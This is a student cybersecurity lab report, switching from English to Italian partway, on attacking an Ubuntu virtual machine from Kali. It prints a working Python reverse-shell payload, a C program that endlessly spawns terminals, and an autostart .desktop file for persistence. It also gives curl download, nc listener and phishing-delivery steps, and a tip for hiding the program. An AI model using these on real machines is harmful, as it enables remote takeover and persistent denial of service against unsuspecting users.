## Huseinovic Elma
## Cybersecurity report 

# Reverse shell and Denial of service with persistence on an Ubuntu virtual machine

## Introduction

The goal of the demo is to create a persistent Denial of Service on an Ubuntu virtual machine, which will therefore be the attacked machine, while a Kali virtual machine was used for the attacker. To do this, a reverse shell is first created to allow the attacking machine to act freely on the Ubuntu machine.

## Kali Preparation
First of all, all the necessary files were created on Kali.
First, the `reverseshell.sh` file, where the is the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
```py
export RHOST="10.0.2.2";
export RPORT=4444;
python3 -c 'import socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("/bin/sh")&'
```
which allows to create a reverse shell in the background when executed on the attacked machine.
Then, a very simple C program, `dos.c`, was created, containing an infinite while loop that continues to open terminal windows:
```c
#include <stdlib.h>
int main(){
    while(1){
        system("gnome-terminal");
    }
    return 0;
}
```
The terminal was chosen to be opened for simplicity, it is possible to do it with other applications and also open several of them, creating a real crash of the machine.
Finally, the `dos.desktop` file was created:
```js
[Desktop Entry]                  
Type=Application                
Exec=/home/ubuntu/dos            
Hidden=false                     
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=dos
Name=dos
Comment[eu_US]=
Comment=
```
It will be used to insert the program that executes the Denial of Service among the applications that open at the start of the machine.
The Hidden and NoDisplay flags, to highlight the Denial of Service, have been set to false, if they are set to true, the program runs without the user noticing anything, so the machine is slowed down without being able to understand the reason.
Once the files were created, a web file server was also created on port 80, using the command.
`python -m http.server 80`

![Web File Server](images/webfileserverdemo.png)

At this point, the only thing left to do is to listen on the default port, to do this it was used the command: `nc -lvp 4444 -n`

# Reverse shell 

To create the reverse shell, it is necessary for the user on the attacked machine to be convinced to download and execute the `reverseshell.sh` file, this could be done by creating a phishing email and convincing him, for example, that it is a security patch. In the demo, the command `curl -O "http://10.0.2.2/demo/reverseshell.sh"` is used, which downloads the file from the web file server created on Kali, at this point the command `sudo chmod +x reverseshell.sh` is executed which adds the execution permission to the file with administrator privileges, finally the file is executed with `./reverseshell.sh`.
At this point, being the reverse shell executed in the background, the user on Ubuntu can continue to use the terminal normally, without noticing anything, but in reality he is connected on port 4444 to the Kali machine through a reverse shell.

![Reverse Shell](images/reverseshell.png)

# DoS e persistence

Utilizzando la reverse shell, ora, è facile scaricare il programma `dos.c` e il file `dos.desktop` dal web file server di Kali utilizzando sempre il comando `curl`:
`curl -O "http://10.0.2.2/demo/dos.c"`
`curl -O "http://10.0.2.2/demo/dos.desktop"`
ora, il programma dos.c viene compilato utilizzando il comando `ggc -o dos dos.c`, viene creato, così, l'eseguibile. Prima di eseguirlo, però, bisogna creare persistenza: il file `dos.desktop` viene spostato in `.config/autostart`, per fare ciò viene utilizzato il comando `mv`, che deve, però, essere eseguito con privilegi di amministratore, quindi utilizzando `sudo`, questo implica che l'attaccante debba conoscere la password dell'account. Una volta che `dos.desktop` viene spostato, il programma `dos` è visibile in Startup Application Preferences, che mostra i programmi che vengono eseguiti allo startup della macchina. 

![Startup Application Preferences](images/startupapplications.png)

quindi, ogni volta che avverrà l'accesso alla macchina, verranno aperte in loop innumerevoli finestre di terminale, rendendolo inutilizzabile. 

![DoS](images/dos.png)

Inoltre, un'altra feature interessante è che, provando a rimuovere `dos` utilizzando l'applicazione Startup Application Preferences e riavvinado la macchina, il programma viene eseguito comunque, questo perchè non viene rimosso il file `dos.desktop` presente in `.config/autostart`, il quale continua rimettere il programma tra le applicazioni da eseguire all'avvio. 
Per fermare questo attacco si potrebbe pensare di cancellare l'eseguibile `dos`, ma nel caso in cui questo venga a sua volta posto in una cartella non facilmente raggiungibile, questo non si potrebbe fare, soprattutto se non si sa cosa sta succedendo e se la macchina comincia a crashare. 
In alternativa si potrebbe pensare si cancellare il file dos.desktop, ma essendo collocato in una directory nascosta di default ed essendo il terminale non utilizzabile, questo potrebbe risultare difficile.

